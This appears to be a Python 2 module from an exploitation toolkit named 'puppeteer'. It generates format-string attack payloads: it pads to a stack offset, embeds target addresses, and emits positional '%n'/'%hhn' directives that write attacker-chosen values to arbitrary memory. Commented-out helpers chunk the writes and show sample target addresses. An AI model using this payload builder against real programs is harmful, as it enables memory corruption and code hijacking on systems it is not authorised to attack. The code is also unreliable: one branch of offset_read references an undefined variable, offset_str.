#!/usr/bin/env python

import logging
l = logging.getLogger("puppeteer.formatter")

import struct
import math

#import operator
#def chunk(writes, word_size=4, chunk_size=1):
#	'''
#	Splits a bunch of writes into different chunks
#
#	Note: I *think* it's little-endian specific
#
#	@param writes: a list of (target, value) locations (of size word_size) to overwrite
#	@param word_size: the word size (in bytes) of the architecture (default: 4)
#	@param chunk_size: the size (in bytes) of the desired write chunks (default: 1)
#	'''
#	byte_writes = []
#	offsets = range(8 * word_size, -1, -8 * chunk_size)[1:]
#	mask_piece = int("FF" * chunk_size, 16)
#
#	# it's a pain to pass a single write as tuples, so let's handle that
#	if type(writes[0]) in (int, long):
#		writes = (writes,)
#
#	for target, value in writes:
#		for offset in offsets:
#			# Masking and shifting; int is necessary to prevent longs
#			mask = mask_piece << offset
#			masked = int((value & mask) >> offset)
#			byte_writes.append((target + offset/8, masked, chunk_size))
#
#	return sorted(byte_writes, key=operator.itemgetter(1))


def pad_to_offset(byte_offset, word_size=4):
	'''
	Pads the format string to the given offset.

	@param byte_offset: the number of bytes to pad the string
	@param word_size: the word size (in bytes) of the architecture (default: 4)
	'''
	word_offset = byte_offset / word_size
	fmt = "A" * (-byte_offset % word_size)

	# The format_string was padded
	if fmt:
		word_offset += 1

	return fmt, word_offset

def offset_read(offset, read_pad, max_offset=None, round_to=None, pad_with="_"):
	'''
	Builds an format string for reading at a specified offset.

	@param offset: the offset
	@param read_pad: the number in the %08x part
	@param max_offset: the maximum offset to expect, to make padding easier (and avoid stack movement)
	@param round_to: alternatively, round the size of the format string up to this many bytes
	@param round_with: the character to use for padding (default '_')
	'''
	if max_offset is not None:
		offset_fmt = "%%0%dd" % int(math.ceil(math.log(max_offset, 10)))
		offset_str = offset_fmt % offset
	else:
		offset = ""
	fmt = "%%%s$0%dx" % (offset_str, read_pad)

	if round_to is not None:
		fmt += pad_with * (round_to - (len(fmt) % round_to))
	return fmt

def format_string(writes, byte_offset, current_length=0, pad_to=0, word_size=4, endness="<"):
	'''
	Builds the whole format string

	@param writes: a list of (addr, content_as_bytes) tuples to overwrite
	@param byte_offset: the offset in bytes on the stack to the format string
	@param current_length: the length of the format string prefix (if there is one)
	@param pad_to: the size of the format string to generate
	@param word_size: the word size of the architecture
	'''
	l.debug("Starting format string build...")
	format_start, word_offset = pad_to_offset(byte_offset, word_size=word_size)
	format_start += "".join(struct.pack("=I", t) for t, _ in writes)
	format_end = ""

	current_length += len(format_start)

	modifiers = { 1: "hh", 2: "h", 4: "", 8: "ll" }
	struct_fmts = { 1: "B", 2: "H", 4: "I", 8: "Q" }
	for t, c in writes:
		l.debug("... adding write to 0x%x of size %d", t, len(c))
		v = struct.unpack(endness + struct_fmts[len(c)], c)[0]
		next_length = (v - current_length) % (256 ** len(c))

		# For 4 and less characters, printing directly is more efficient
		# For 5 to 8, the general method can't be used
		# Otherwise, use general method
		if next_length < 5:
			format_end += "A" * next_length
		elif next_length < 8:
			format_end += "%{:d}hhx".format(next_length)
		else:
			format_end += "%{:d}x".format(next_length)
		current_length += next_length

		format_end += "%{:d}${:s}n".format(word_offset, modifiers[len(c)])
		word_offset += 1

	# Pad and return the built format string
	fmt = format_start + format_end
	l.debug("... created format strng |%s| of length %s.", fmt, len(fmt))
	return fmt + "B" * (pad_to - len(fmt))

#def main():
#	import sys
#	l.setLevel(logging.DEBUG)
#
#	writes = ((0x45397010, 0x01020304), (0x45397014, 0x11121314))
#	chunks = chunk(writes, 4, 2)[0:1] + chunk(writes, 4, 1)[2:]
#
#	print format_string(chunks, int(sys.argv[1]), 1024, 0)
#
#
#def usage():
#	print "Super Formatter 64!"
#	print " Usage: {} <offset> <t|f>".format(sys.argv[0])
#	sys.exit(1)
#
#
#if __name__ == "__main__":
#	if len(sys.argv) != 3:
#		usage()
#	main()
